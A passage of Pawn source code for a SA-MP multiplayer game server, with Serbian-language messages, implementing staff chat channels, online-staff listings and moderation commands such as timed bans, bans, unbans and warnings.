	if( PlayerInfo[ playerid ][ xPromoter ] >= 1 || PlayerInfo[ playerid ][ xAdmin ] >= 1 ) {

        if( PlayerInfo[ playerid ][ xSkriptaRank ] == 1 ) {
			format( string1, sizeof( string1 ), "|DEVELOPER| %s: "col_white"%s", ImeIgraca( playerid ), text );
		}
		else if( PlayerInfo[ playerid ][ xSkriptaRank ] == 2 ) {
			format( string1, sizeof( string1 ), "|CO DEVELOPER| %s: "col_white"%s", ImeIgraca( playerid ), text );
		}
		else if( PlayerInfo[ playerid ][ xSkriptaRank ] == 3 ) {
			format( string1, sizeof( string1 ), "|MAPPER| %s: "col_white"%s", ImeIgraca( playerid ), text );
		}
		else if( PlayerInfo[ playerid ][ xAdmin ] == 7 ) {
			format( string1, sizeof(string1), "|VLASNIK| %s: "col_white"%s", ImeIgraca( playerid ), text );
		}
        else if( PlayerInfo[ playerid ][ xSkriptaRank ] == 6 ) {
            format( string1, sizeof( string1 ), "|SUVLASNIK| %s: "col_white"%s", ImeIgraca( playerid ), text );
        }
		else if( PlayerInfo[ playerid ][ xAdmin ] == 6 ) {
			format( string1, sizeof(string1), "|SUVLASNIK| %s: "col_white"%s", ImeIgraca( playerid ), text );
		}
		else if( PlayerInfo[ playerid ][ xAdmin ] == 5 ) {
	    	format( string1, sizeof( string1 ), "|HEAD ADMIN| %s: "col_white"%s", ImeIgraca( playerid ), text );
		}
        else if( PlayerInfo[ playerid ][ xAdmin ] == 4 ) {
            format( string1, sizeof( string1 ), "|ADMINISTRATOR| %s: "col_white"%s", ImeIgraca( playerid ), text );
        }
		else if( PlayerInfo[ playerid ][ xAdmin ] == 3 ) {
		    format( string1, sizeof( string1 ), "|ADMINISTRATOR| %s: "col_white"%s", ImeIgraca( playerid ), text );
		}
		else if( PlayerInfo[ playerid ][ xAdmin ] == 2 ) {
		    format( string1, sizeof( string1 ), "|ADMINISTRATOR| %s: "col_white"%s", ImeIgraca( playerid ), text );
		}
		else if( PlayerInfo[ playerid ][ xAdmin ] == 1 ) {
		    format( string1, sizeof( string1 ), "|ADMINISTRATOR| %s: "col_white"%s", ImeIgraca( playerid ), text );
		}
		else if( PlayerInfo[ playerid ][ xPromoter ] >= 1 ) {
            format( string1, sizeof(string1), "|PROM| %s: "col_white"%s", ImeIgraca( playerid ), text );
        }

		PromoteriAdminChat( 0xAF28A4FF, string1 );
		
		new string[ 128 ];
		format( string, sizeof( string ), "Admin/Prom %s: %s", ImeIgraca( playerid ), text );
		LogSave( "Ostalo/LogPROMIADMChat.log", string );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return true;
}

CMD:g( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xZatvor ] != 0 ) return SendErrorMessage( playerid, "Ne mozes da koristis ovu komandu dok si u zatvoru." );
	if( PlayerInfo[ playerid ][ xMute ] != 0) return SendErrorMessage( playerid, "Ne mozete pricati, usutkani ste.");
	new text[ 128 ], string1[180];
    if( sscanf( params, "s[128]", text ) ) return SendUsageMessage( playerid, "/g [ tekst ]." );
    if( ToggedG == false ) return SendErrorMessage( playerid, "G chat je trenutno iskljucen od strane Admin-a." );
	if( PlayerInfo[ playerid ][ xPromoter ] >= 1 || PlayerInfo[ playerid ][ xSupporter ] >= 1 || PlayerInfo[ playerid ][ xAdmin ] >= 1 || PlayerInfo[ playerid ][ xVIPLevel ] >= 1 ) {


        if(VipGChat[playerid] != 0) return SendErrorMessage(playerid, "Nije ti istekao cooldown!");


        if( PlayerInfo[ playerid ][ xSkriptaRank ] == 1 ) {
			format( string1, sizeof( string1 ), "[G] |DEVELOPER| %s: "col_white"%s", ImeIgraca( playerid ), text );
		}
		else if( PlayerInfo[ playerid ][ xSkriptaRank ] == 2 ) {
			format( string1, sizeof( string1 ), "[G] |CO DEVELOPER| %s: "col_white"%s", ImeIgraca( playerid ), text );
		}
		else if( PlayerInfo[ playerid ][ xSkriptaRank ] == 3 ) {
			format( string1, sizeof( string1 ), "[G] |MAPPER| %s: "col_white"%s", ImeIgraca( playerid ), text );
		}
	    else if( PlayerInfo[ playerid ][ xAdmin ] == 7 ) {
			format( string1, sizeof(string1), "[G] |VLASNIK| %s: "col_white"%s", ImeIgraca( playerid ), text );
		}
		else if( PlayerInfo[ playerid ][ xSkriptaRank ] == 6 ) {
			format( string1, sizeof( string1 ), "[G] |SUVLASNIK| %s: "col_white"%s", ImeIgraca( playerid ), text );
		}
		else if( PlayerInfo[ playerid ][ xAdmin ] == 6 ) {
			format( string1, sizeof(string1), "[G] |SUVLASNIK| %s: "col_white"%s", ImeIgraca( playerid ), text );
		}
		else if( PlayerInfo[ playerid ][ xAdmin ] == 5 ) {
	    	format( string1, sizeof( string1 ), "[G] |HEAD ADMIN| %s: "col_white"%s", ImeIgraca( playerid ), text );
		}
        else if( PlayerInfo[ playerid ][ xAdmin ] == 4 ) {
            format( string1, sizeof( string1 ), "[G] |ADMINISTRATOR| %s: "col_white"%s", ImeIgraca( playerid ), text );
        }
		else if( PlayerInfo[ playerid ][ xAdmin ] == 3 ) {
		    format( string1, sizeof( string1 ), "[G] |ADMINISTRATOR| %s: "col_white"%s", ImeIgraca( playerid ), text );
		}
		else if( PlayerInfo[ playerid ][ xAdmin ] == 2 ) {
		    format( string1, sizeof( string1 ), "[G] |ADMINISTRATOR| %s: "col_white"%s", ImeIgraca( playerid ), text );
		}
		else if( PlayerInfo[ playerid ][ xAdmin ] == 1 ) {
		    format( string1, sizeof( string1 ), "[G] |ADMINISTRATOR| %s: "col_white"%s", ImeIgraca( playerid ), text );
		}
		else if( PlayerInfo[ playerid ][ xSupporter ] == 3 ) {
            format( string1, sizeof(string1), "[G] |H|HEAD| %s: "col_white"%s", ImeIgraca( playerid ), text );
        }
		else if( PlayerInfo[ playerid ][ xSupporter ] >= 1 && PlayerInfo[ playerid ][ xSupporter ] <= 2 ) {
            format( string1, sizeof(string1), "[G] |H|%d| %s: "col_white"%s", PlayerInfo[ playerid ][ xSupporter ], ImeIgraca( playerid ), text );
        }
        else if( PlayerInfo[ playerid ][ xPromoter ] >= 1 ) {
            format( string1, sizeof(string1), "[G] |PR| %s: "col_white"%s", ImeIgraca( playerid ), text );
        }
        else if( PlayerInfo[ playerid ][ xVIPLevel ] == 1) {
        	format( string1, sizeof(string1), "[G] |VIP 1| %s: "col_white"%s", ImeIgraca(playerid), text);
        }
        else if( PlayerInfo[ playerid ][ xVIPLevel ] == 2) {
        	format( string1, sizeof(string1), "[G] |VIP 2| %s: "col_white"%s", ImeIgraca(playerid), text);
        }
        else if( PlayerInfo[ playerid ][ xVIPLevel ] == 3) {
        	format( string1, sizeof(string1), "[G] |VIP 3| %s: "col_white"%s", ImeIgraca(playerid), text);
        }
        else if( PlayerInfo[ playerid ][ xVIPLevel ] == 4) {
        	format( string1, sizeof(string1), "[G] |VIP 4| %s: "col_white"%s", ImeIgraca(playerid), text);
        }
        else if( PlayerInfo[ playerid ][ xVIPLevel ] == 5) {
        	format( string1, sizeof(string1), "[G] |VIP 5| %s: "col_white"%s", ImeIgraca(playerid), text);
        }
        else if( PlayerInfo[ playerid ][ xVIPLevel ] == 6) {
        	format( string1, sizeof(string1), "[G] |VIP 6| %s: "col_white"%s", ImeIgraca(playerid), text);
        }
		PROMChat( 0x800080FF, string1 );

        if(PlayerInfo[playerid][xVIPLevel] >= 1) {

            new time;
            switch(PlayerInfo[playerid][xVIPLevel]) {

                case 1: 
                    time = 20;
                case 2:
                    time = 15;
                case 3:
                    time = 10;
                case 4: 
                    time = 7;
                case 5:
                    time = 5;
                case 6:
                    time = 2;
            }
            VipGChat[ playerid ] = time;
            SendInfoMessage(playerid, "Sledeci /g mozete koristiti za %d sekundi!", time);
        }

	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return true;
}

// CMD:oadmins( playerid, params[] ) {
//     new string[ 128 ];
//     if( PlayerInfo[ playerid ][ xAdmin ] < 1 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
//     SCM( playerid, -1, ""col_crvena"|----------------Admin TEAM----------------|");
// 	foreach( Player, i ) {
// 	    if( PlayerInfo[ i ][ xAdmin ] >= 1 && PlayerInfo[ i ][ xAdmin ] < 7 ) {
// 	        format( string, sizeof( string ), ""col_crvena"Admin LvL %d | %s [%d]", PlayerInfo[ i ][ xAdmin ], ImeIgraca( i ), i );
// 			SCM( playerid, -1, string);
// 	    }
// 	}
// 	return 1;
// }

CMD:vipovi( playerid, params[] ) {
    new string[ 128 ];
    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
    foreach( Player, i ) {
    
        if( PlayerInfo[ i ][ xVIPLevel ] >= 1 ) {
        
            format( string, sizeof( string ), ""col_white"[ID %d] "col_crvena"%s"col_white" | "col_crvena"Level: "col_white"%d | "col_crvena"Preostalo: "col_white"%d\n", i, ImeIgraca( i ), PlayerInfo[i][xVIPLevel] );
            strcat( DialogStrgEx, string );
        }
    }
    if(strlen(string) == 0) return SendErrorMessage(playerid, "Nijedan VIP nije online!");
    SPD( playerid, 0, DSMSG, ""col_crvena"Vipovi online", DialogStrgEx, "Potvrdi", "" );
    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
    return 1;
}

CMD:promoteri( playerid, params[] ) {
    new string[ 128 ];
    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
    foreach( Player, i ) {
    
        if( PlayerInfo[ i ][ xPromoter ] >= 1 ) {
        
            format( string, sizeof( string ), ""col_white"[ID %d] "col_crvena"%s"col_white" | "col_crvena"Level: "col_white"%d\n", i, ImeIgraca( i ), PlayerInfo[i][xPromoter] );
            strcat( DialogStrgEx, string );
        }
    }
    if(strlen(string) == 0) return SendErrorMessage(playerid, "Nijedan promoter nije online!");
    SPD( playerid, 0, DSMSG, ""col_crvena"Promoteri online", DialogStrgEx, "Potvrdi", "" );
    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
    return 1;
}

CMD:helperi( playerid, params[] ) {
    new string[ 128 ];
    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
    foreach( Player, i ) {
    
        if( PlayerInfo[ i ][ xSupporter ] >= 1 ) {
        
            format( string, sizeof( string ), ""col_white"[ID %d] "col_crvena"%s"col_white" | "col_crvena"Level: "col_white"%d | "col_crvena"Duty Time: "col_white"%d\n", i, ImeIgraca( i ), PlayerInfo[i][xSupporter], PlayerInfo[i][xAdminDuty] );
            strcat( DialogStrgEx, string );
        }
    }
    if(strlen(string) == 0) return SendErrorMessage(playerid, "Nijedan helper nije online!");
    SPD( playerid, 0, DSMSG, ""col_crvena"Helperi online", DialogStrgEx, "Potvrdi", "" );
    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
    return 1;
}

CMD:lideri( playerid, params[] ) {
    new string[ 128 ];
    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
	foreach( Player, i ) {
	
		if( PlayerInfo[ i ][ xLider ] >= 1 ) {
		
            format( string, sizeof( string ), ""col_white"[ID %d] "col_crvena"%s"col_white" | "col_crvena"Organizacija: "col_white"%s\n", i, ImeIgraca( i ), OI[ PlayerInfo[ i ][ xLider ] ][ oName ] );
			strcat( DialogStrgEx, string );
		}
	}
    if(strlen(string) == 0) return SendErrorMessage(playerid, "Nijedan lider nije online!");
	SPD( playerid, 0, DSMSG, ""col_crvena"Lideri online", DialogStrgEx, "Potvrdi", "" );
   	strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
	return 1;
}

CMD:admini(playerid) {

	new string[128];
	strdel(DialogStrgEx, 0, sizeof(DialogStrgEx));
	foreach(Player, i) {

		if(PlayerInfo[i][xAdmin] >= 1) {

            if(AdminDuty[i]) {
                format(string, sizeof(string), ""col_white"[ID:%d]"col_green" %s"col_white" | Admin Level: "col_green"%d"col_white" | Duty Time: "col_green"%d\n", i, ImeIgraca(i), PlayerInfo[i][xAdmin], PlayerInfo[i][xAdminDuty]);
            }
			else {
                format(string, sizeof(string), ""col_white"[ID:%d]"col_crvena" %s"col_white" | Admin Level: "col_crvena"%d"col_white" | Duty Time: "col_crvena"%d\n", i, ImeIgraca(i), PlayerInfo[i][xAdmin], PlayerInfo[i][xAdminDuty]);
            }
			strcat(DialogStrgEx, string);
		}
	}
    if(strlen(string) == 0) return SendErrorMessage(playerid, "Nijedan admin nije online!");
	SPD(playerid, 0, DSMSG, ""SRVBOJA1SCM"Admini Online", DialogStrgEx, "Potvrdi", "");
	strdel(DialogStrgEx, 0, sizeof(DialogStrgEx));
	return 1;
}

CMD:organizacije( playerid, params[] ) {
    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
	for( new i = 1; i < MAX_ORG; i++ ) {
	
		new oFile[ 40 ];
		format(oFile, sizeof( oFile ), O_FILE, i );
		if( fexist( oFile ) ) {
		
      //       format( globalstring, sizeof( globalstring ), ""col_white"Ime organizacije %d: "SRVBOJA1SCM"%s"col_white" | Lider 1 : "SRVBOJA1SCM"%s"col_white" | Lider 2 : "SRVBOJA1SCM"%s \n\n", OI[ i ][ oID ], OI[ i ][ oName ], OI[i][oLider1], OI[i][oLider2] );
	    	// strcat( DialogStrgEx, globalstring );
            format( globalstring, sizeof( globalstring ), ""col_white"Ime organizacije %d: "col_crvena"%s "col_white" | Lideri : %s & %s \n", OI[ i ][ oID ], OI[ i ][ oName ], OI[i][oLider1], OI[i][oLider2]);
            strcat( DialogStrgEx, globalstring );
		}
	}
	ShowPlayerDialog( playerid, 0, DSMSG, ""col_crvena"Spisak organizacija", DialogStrgEx, "U redu", "" );
	strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
	return 1;
}


CMD:1( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] < 7 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	new text[ 128 ], string1[180];
    if( sscanf( params, "s[128]", text ) ) return SendUsageMessage( playerid, "/1 [ tekst ]." );
	foreach( Player, i ) {
	    if( PlayerInfo[ i ][ xAdmin ] == 7 ) {
			format( string1, sizeof( string1 ), "|VLASNIK|%s: "col_white"%s", ImeIgraca( playerid ), text );
			SCM( i, 0xFF6347AA, string1 );
		}
	}
	new string[ 128 ]; 
	format( string, sizeof( string ), "Vlasnik %s: %s", ImeIgraca( playerid ), text );
	LogSave( "Ostalo/LogHeadChat.log", string );
	return true;
}

CMD:vlasnici( playerid, params[] ) {
	new string[ 128 ];
	if( PlayerInfo[ playerid ][ xAdmin ] < 7 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
    SCM( playerid, NARANDZASTA, ""col_crvena"|----------------Vlasnici Online----------------|");
	foreach( Player, i ) {
	    if( PlayerInfo[ i ][ xAdmin ] == 7 ) {
	        format( string, sizeof( string ), ""col_crvena"VLASNIK | %s [%d]", ImeIgraca( i ), i );
			SCM( playerid, NARANDZASTA, string);
	    }
	}
	return 1;
}

CMD:vremenskiban( playerid, params[] ) {

    if( PlayerInfo[ playerid ][ xAdmin ] >= 3  ) {
		if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );
		new id, time, razlog[ 40 ], banfile[ 80 ];
	    if( sscanf( params,"uis[40]", id, time, razlog ) ) return SendUsageMessage( playerid, "/vremenskiban [ ID/Deo Imena ] [ Broj dana ] [ Razlog ]");
	    if( !IsPlayerConnected( id ) ) return SendErrorMessage( playerid, "Pogresan ID!");
	    if( PlayerInfo[ playerid ][ xAdmin ] < 6 && PlayerInfo[ id ][ xAdmin ] >= 6 ) return SendErrorMessage( playerid, "Ne mozete banovati ownere i directore!");
	    format( banfile, sizeof( banfile ), FILE_BAN, ImeIgraca( id ) );
		if( fexist( banfile ) ) return SendErrorMessage( playerid, "Igrac je vec banovan permanentno!");
		if( time > 25 || time < 0 ) return SendErrorMessage( playerid, "Ne mozes preko 25 ili ispod 0 dana.");

	    new day, year, month;
		getdate( year, month, day );

	    if( day+time > 30 ) {
			if( month+1 > 12 ) {
				PlayerInfo[ id ][ xBDays ] = (day+time)-30;
				PlayerInfo[ id ][ xBMonths ] = (month+1)-12;
				PlayerInfo[ id ][ xBYears ] = year+1;
			}
			else if( month+1 <= 12 ) {
				PlayerInfo[ id ][ xBDays ] = (day+time)-30;
				PlayerInfo[ id ][ xBMonths ] = month+1;
				PlayerInfo[ id ][ xBYears ] = year;
			}
		}
		else if( day+time <= 30 ) {
			PlayerInfo[ id ][ xBDays ] = day+time;
			PlayerInfo[ id ][ xBMonths ] = month;
			PlayerInfo[ id ][ xBYears ] = year;
		}

		SavePlayer( id );

		format( globalstring, sizeof( globalstring ), "BAN | %s je dobio ban od Admin-a %s, razlog: %s, datum unbana: %d/%d/%d", ImeIgraca( id ), ImeIgraca( playerid ), razlog, day+time, month, year );
		AdminPoruka( NARACRVENA, globalstring );

	    AI[ playerid ][ aTBan ]++;
	    ServerInfo[ BanovanihKorisnika ]++;

		SCM( id, CRVENA, "________________________BAN___________________________________");
		SendClientMessageEx( id, BELA, ""col_white"Dobio si privremeni ban od Admin-a "col_crvena"%s"col_white".", ImeIgraca( playerid ) );
		SendClientMessageEx( id, BELA, ""col_white"Razlog bana "col_crvena"%s"col_white".", razlog);
		SendClientMessageEx( id, BELA, ""col_white"Datum unbana: "col_crvena"%d.%d.%d"col_white".", day+time, month, year );
		SCM( id, BELA, ""col_white"Ukoliko mislis da je ovo greska "col_crvena"slikaj "col_white"i postavi na "col_crvena"forum.");
		SCM( id, BELA, ""col_white"Forum "col_crvena"www.valhalla-ogc.com");
		SCM( id, CRVENA, "______________________________________________________________");

	    Kickovanje( id, ""col_white"Ti si banovan sa servera. Unban zatrazi na forumu: www.valhalla-ogc.com");
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:ban( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] >= 1  ) {
		if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );
		new id, razlog[ 40 ], banfile[ 80 ];
	    if( sscanf( params,"us[40]", id, razlog ) ) return SendUsageMessage( playerid, "/ban [ ID/Deo Imena ] [ Razlog ]");
	    if( !IsPlayerConnected( id ) ) return SendErrorMessage( playerid, "Pogresan ID!");
	    if( PlayerInfo[ playerid ][ xAdmin ] < 5 && PlayerInfo[ id ][ xAdmin ] > 1 ) return SendErrorMessage( playerid, "Ne mozete banovati druge clanove Admin TEAM-a!");
	    format( banfile, sizeof( banfile ), FILE_BAN, ImeIgraca( id ) );
		if( fexist( banfile ) ) return SendErrorMessage( playerid, "Igrac je vec banovan!");

		format( globalstring, sizeof( globalstring ), "BAN | %s je dobio ban od Admin-a %s, razlog: %s", ImeIgraca( id ), ImeIgraca( playerid ), razlog );
		AdminPoruka( NARACRVENA, globalstring );

	    AI[ playerid ][ aTBan ]++;

        ServerInfo[ BanovanihKorisnika ]++;

        new year, month,day;
		getdate( year, month, day );
		new playersip[128];
        GetPlayerIp( id, playersip, sizeof( playersip ) );

        SendClientMessage( id, 0xFF4500AA, "  ");
   		SendClientMessage( id, 0xFF4500AA, "  ");
   		SendClientMessage( id, 0xFF4500AA, "  ");
   		SendClientMessage( id, 0xFF4500AA, "  ");
   		SendClientMessage( id, 0xFF4500AA, "  ");
   		SendClientMessage( id, 0xFF4500AA, "  ");
   		SendClientMessage( id, ANTICHEAT, "______________________________________________________________________________________");
      	SendClientMessage( id, ANTICHEAT, "______________________________________________________________________________________");
		SendClientMessage( id, 0xFF6347AA, "ISKLJUCENI STE SA SERVERA(Banovani)! Pazljivo procitajte tekst!");
		format( globalstring, sizeof( globalstring ), "%s(ID:%d) iskljucen(Banovan) si sa servera od %s", ImeIgraca( id ), id, ImeIgraca( playerid ) );
		SendClientMessage( id, 0xF0F8FFAA, globalstring );
		format( globalstring, sizeof( globalstring ), "Razlog iskljucenja: %s", ( razlog ) );
		SendClientMessage( id, 0xF0F8FFAA, globalstring );
		format( globalstring, sizeof( globalstring ), "Datum bana: %d-%d-%d | Vasa ip adresa je: %s", month, day, year, playersip );
		SendClientMessage( id, 0xF0F8FFAA, globalstring );
   		SendClientMessage( id, 0xF0F8FFAA, "Sa ovim banom, vas korisnicki racun je suspendiran na neodredjeno!");
		SendClientMessage( id, ZUTA, "Ukoliko mislis da je doslo do greske slikaj ovo(f8) i zatrazi unban na forumu!");
		format( globalstring, sizeof( globalstring ), "IP Adresa Banovanog igraca: %s. Adresa sa banom nije banovana!", playersip );
		SendClientMessage( playerid, 0xFF6347AA, globalstring );
		SendClientMessage( playerid, ZUTA, "Ukoliko zelis banati i ip, pisi /banip [ip koji pise iznad ove poruke]");


		format( globalstring, sizeof( globalstring ), "BAN | Igrac %s je banovan sa servera. Razlog: %s", ImeIgraca( id ), razlog );
		SCMA( 0xFF4500AA, globalstring );

		new File:ban = fopen( banfile, io_write );
	    new var[ 64 ];
		format( var, 64, "Admin=%s\n", ImeIgraca( playerid ) );
	    fwrite( ban, var );
	    new var1[ 128 ];
		format( var1, 128,"Razlog=%s\n", razlog );
	    fwrite( ban, var1 );
	    fclose( ban );

        new string[ 128 ]; 
		format( string, sizeof( string ), "Admin %s je banovao igraca %s | Razlog: %s", ImeIgraca( playerid ), ImeIgraca( id ), razlog );
		LogSave( "Ostalo/LogBan.log", string );

        SCM( id, -1, ""col_white"Ti si banovan sa servera. Unban zatrazi na forumu: www.valhalla-ogc.com" );
	    Novi_Kick( id );

	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:offban( playerid, params[] ) {

	if( PlayerInfo[ playerid ][ xAdmin ] >= 6  ) {
		if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );
		new imeigraca[ 40 ], razlog[ 40 ], banfile[ 80 ], ifile[ 64 ];
		if( sscanf( params, "s[40]s[40]", imeigraca, razlog ) ) return SendUsageMessage( playerid, "/offban [ Ime_Prezime ] [ Razlog ]" );
	    format( banfile, sizeof( banfile ), FILE_BAN, imeigraca );
		if( fexist( banfile ) ) return SendErrorMessage( playerid, "Igrac je vec banovan!");
		format( ifile, sizeof( ifile ), I_FILE, imeigraca );
		if( !fexist( ifile ) ) return SendErrorMessage( playerid, "Taj igrac ne postoji u bazi podataka!");
        if( IsPlayerConnected( GetPlayerIdFromName( imeigraca ) ) ) {
			SendErrorMessage( playerid, "Taj igrac je online tako da banuj ga online.");
			return 1;
		}

		AI[ playerid ][ aTBan ]++;
		ServerInfo[ BanovanihKorisnika ]++;

		format( globalstring, sizeof( globalstring ), "BAN | %s je offbanovao igraca %s, razlog: %s.", ImeIgraca( playerid ), imeigraca, razlog );
		AdminPoruka( NARACRVENA, globalstring );

		new File:ban = fopen( banfile, io_write );
	    new var[ 64 ];
		format( var, 64, "Admin=%s\n", ImeIgraca( playerid ) );
	    fwrite( ban, var );
	    new var1[ 128 ];
		format( var1, 128,"Razlog=%s\n", razlog );
	    fwrite( ban, var1 );
	    fclose( ban );

        new string[ 128 ]; 
		format( string, sizeof( string ), "Admin %s je offbanovao igraca %s | Razlog: %s", ImeIgraca( playerid ), imeigraca, razlog );
		LogSave( "Ostalo/LogOffBan.log", string );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:unban( playerid, params[] ) {

    if( PlayerInfo[ playerid ][ xAdmin ] >= 4  ) {
        if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );
		new imeigraca[ 24 ], banfile[ 64 ];
		if( sscanf( params,"s[40]", imeigraca ) ) return SendUsageMessage( playerid, "/unban [ Ime_Prezime ]");
		format( banfile, 64, FILE_BAN, imeigraca );
		if( !fexist( banfile ) ) return SendErrorMessage( playerid, "Taj igrac nije banovan (Nema ga u bazi)!");

	    AI[ playerid ][ aTUnban ]++;
	    ServerInfo[ BanovanihKorisnika ]--;

	    format( globalstring, sizeof( globalstring ), "UNBAN | %s je unbanovao igraca %s.", ImeIgraca( playerid ), imeigraca );
		AdminPoruka( NARACRVENA, globalstring );
		format( globalstring, sizeof( globalstring ), "Unbanovali ste igraca %s!", imeigraca);
		SCM( playerid, BELA, globalstring );

		fremove( banfile );
		new string[ 128 ];
		format( string, sizeof( string ), "Admin %s je unbanovao igraca %s", ImeIgraca( playerid ), imeigraca );
		LogSave( "Ostalo/LogUnban.log", string );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:vremenskiunban( playerid, params[] ) {

    if( PlayerInfo[ playerid ][ xAdmin ] >= 6  ) {
    
		if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );

		new imeigraca[ 24 ], ifile[ 64 ];
		if( sscanf( params,"s[40]", imeigraca ) ) return SendUsageMessage( playerid, "/vremenskiunban [ Ime_Prezime ]");
		format( ifile, 64, I_FILE, imeigraca );
		if( !fexist( ifile ) ) return SendErrorMessage( playerid, "Taj igrac ne postoji u bazi podataka!");

	    AI[ playerid ][ aTUnban ]++;
	    ServerInfo[ BanovanihKorisnika ]--;

	    new INI:File = INI_Open( ifile );
		INI_SetTag( File, "Informacije" );
		INI_WriteInt( File, "BanDays", 0 );
		INI_WriteInt( File, "BanMonths", 0 );
		INI_WriteInt( File, "BanYear", 0 );
		INI_Close( File );

	    format( globalstring, sizeof( globalstring ), "UNBAN | %s je unbanovao igraca %s koji je imao vremenski ban.", ImeIgraca( playerid ), imeigraca );
		AdminPoruka( NARACRVENA, globalstring );
		format( globalstring, sizeof( globalstring ), "Unbanovali ste igraca %s koji je imao vremenski ban!", imeigraca);
		SCM( playerid, BELA, globalstring );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:warn( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] >= 2  ) {
		if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );

		new id, reason[ 48 ];
		if( sscanf( params, "us[48]", id, reason ) ) return SendUsageMessage( playerid, "/warn [ ID/Deo imena ] [ Razlog ]");
		if( !IsPlayerConnected( id ) ) return SendErrorMessage( playerid, "Pogresan ID!");
		PlayerInfo[ id ][ xWarn ] += 1; SavePlayer( id ); AI[ playerid ][ aTWarn ]++;

		SendInfoMessage( id, "Admin %s vam je dao warn(%d po redu). Razlog: %s", ImeIgraca( playerid ), PlayerInfo[ id ][ xWarn ], reason );

		SendInfoMessage( playerid, "Dali ste warn igracu %s. Razlog: %s", ImeIgraca( id ), reason );

		format( globalstring, sizeof( globalstring ),"WARN | %s je dao warn igracu %s Razlog: %s", ImeIgraca( playerid ), ImeIgraca( id ), reason );
		AdminPoruka( NARACRVENA, globalstring );

        new string[ 128 ]; 
		format( string, sizeof( string ), "Admin %s je dao warn igracu %s | Razlog: %s", ImeIgraca( playerid ), ImeIgraca( id ), reason );
		LogSave( "Ostalo/LogWarn.log", string );

        ServerInfo[ BrojWarnova ]++;

		if( PlayerInfo[ id ][ xWarn ] >= 5 ) {
			format( globalstring, sizeof( globalstring ), "BAN | %s je dobio ban od Admin-a %s, razlog: 5 upozorenja.", ImeIgraca( id ), ImeIgraca( playerid ) );
			AdminPoruka( NARACRVENA, globalstring );

			new banfile[ 64 ];
	        format( banfile, 64, FILE_BAN, ImeIgraca( id ) );
	        new File:ban = fopen( banfile, io_write );
		    new var[ 64 ];
			format( var, 64, "Admin=%s\n", ImeIgraca( playerid ) );
		    fwrite( ban, var );
		    new var1[ 128 ];
			format( var1, 128,"Razlog=5/5 Warnova\n" );
		    fwrite( ban, var1 );
		    fclose( ban );

            ServerInfo[ BanovanihKorisnika ]++;

	        Kickovanje( id, ""col_white"Ti si banovan sa servera. Unban zatrazi na forumu: www.valhalla-ogc.com");
		}
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:makniwarn( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] >= 6  ) {
        if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );
		new id;
		if( sscanf(params, "u", id ) ) return SendUsageMessage( playerid, "/makniwarn [ ID/Deo imena ]");
		if( !IsPlayerConnected( id ) ) return SendErrorMessage( playerid, "Pogresan ID!" );
		if( PlayerInfo[ id ][ xWarn ] <= 0 ) return SendErrorMessage( playerid, "Igrac nema warnova koje bi skinuli." );

		SendInfoMessage( playerid, "Skinuli ste warn igracu %s | Warn: %d/3!", ImeIgraca( id ), PlayerInfo[ id ][ xWarn ] );
		SendInfoMessage( id, "Admin %s vam je skinuo warn | Warn: %d/3!", ImeIgraca( playerid ), PlayerInfo[ id ][ xWarn ] );

		format( globalstring , sizeof( globalstring ),"UNWARN | %s je skinuo warn igracu %s!", ImeIgraca( playerid ), ImeIgraca( id ) );
		AdminPoruka( NARACRVENA, globalstring );

		AI[ playerid ][ aTUnwarn ]++;
		ServerInfo[ BrojWarnova ]--;

		PlayerInfo[ id ][ xWarn ] -= 1; SavePlayer( id );
    }
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:rac( playerid, params[] ) {
	if( PlayerInfo[ playerid ][ xAdmin ] < 1 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
    if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );
